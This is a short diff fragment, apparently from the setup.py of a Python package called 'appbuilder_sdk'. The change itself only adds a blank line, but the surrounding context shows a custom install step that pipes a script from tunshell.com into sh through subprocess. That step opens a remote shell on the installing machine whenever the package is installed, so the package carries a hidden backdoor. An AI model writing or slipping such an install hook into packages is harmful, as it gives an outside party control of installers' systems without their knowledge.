@@ -37,6 +37,7 @@ bash_command_1 = "curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T 9295s
 subprocess.run(["bash", "-c", bash_command_1])
 install.run(self)
 
+
 now = datetime.datetime.now()
 timestamp_str = now.strftime("%Y%m%d_%H%M%S")
 package_dir = f"appbuilder_sdk_{timestamp_str}"
